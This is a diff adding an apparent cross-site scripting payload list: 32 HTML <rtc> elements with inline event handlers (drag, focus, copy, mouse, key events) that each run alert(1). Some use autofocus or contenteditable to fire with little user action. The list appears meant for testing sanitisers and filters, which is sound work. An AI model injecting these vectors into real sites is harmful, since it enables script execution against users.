@@ -1,0 +1,32 @@
+<rtc draggable="true" ondrag="alert(1)">test</rtc>
+<rtc draggable="true" ondragend="alert(1)">test</rtc>
+<rtc draggable="true" ondragenter="alert(1)">test</rtc>
+<rtc draggable="true" ondragleave="alert(1)">test</rtc>
+<rtc draggable="true" ondragstart="alert(1)">test</rtc>
+<rtc id=x tabindex=1 onactivate=alert(1)></rtc>
+<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>
+<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>
+<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>
+<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
+<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
+<rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
+<rtc onbeforecut="alert(1)" contenteditable>test</rtc>
+<rtc onbeforepaste="alert(1)" contenteditable>test</rtc>
+<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onclick="alert(1)">test</rtc>
+<rtc oncontextmenu="alert(1)">test</rtc>
+<rtc oncopy="alert(1)" contenteditable>test</rtc>
+<rtc oncut="alert(1)" contenteditable>test</rtc>
+<rtc ondblclick="alert(1)">test</rtc>
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onkeydown="alert(1)" contenteditable>test</rtc>
+<rtc onkeypress="alert(1)" contenteditable>test</rtc>
+<rtc onkeyup="alert(1)" contenteditable>test</rtc>
+<rtc onmousedown="alert(1)">test</rtc>
+<rtc onmouseenter="alert(1)">test</rtc>
+<rtc onmouseleave="alert(1)">test</rtc>
+<rtc onmousemove="alert(1)">test</rtc>
+<rtc onmouseout="alert(1)">test</rtc>
+<rtc onmouseover="alert(1)">test</rtc>
+<rtc onmouseup="alert(1)">test</rtc>
+<rtc onpaste="alert(1)" contenteditable>test</rtc>
